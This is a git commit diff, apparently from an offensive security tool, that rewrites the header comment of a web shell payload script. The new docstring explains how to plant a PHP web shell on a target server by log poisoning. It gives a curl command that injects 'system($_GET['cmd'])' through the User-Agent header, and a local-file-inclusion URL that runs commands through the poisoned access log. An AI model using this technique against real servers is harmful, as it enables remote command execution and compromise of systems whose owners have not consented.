377b8ad8ec70856ba3e9bf70483b127b59dfba3d
S4m Freeside <snovvcrash@protonmail.ch>
2018-09-10 08:28:12 -0400

    Update comment message

--- payloads/WebShell.py
+++ payloads/WebShell.py
@@ -1,13 +1,14 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-#
-# First run:
-# $ curl -A "<?php system(\$_GET['cmd']); ?>" -X GET "http://<RHOST>:<RPORT>"
-#
-# Target URL would be (for exmaple):
-# http://RHOST:RPORT/browse.php?file=/var/log/httpd-access.log&cmd=
-#
+"""
+First you need to deliver the web shell to the target server,
+e. g. via log poisoning:
+	$ curl -A "<?php system(\$_GET['cmd']); ?>" -X GET "http://<RHOST>:<RPORT>"
+
+Then the target URL would be (for exmaple):
+	http://<RHOST>:<RPORT>/browse.php?file=/var/log/httpd-access.log&cmd=
+"""
 
 
 def genPayload(cmd):
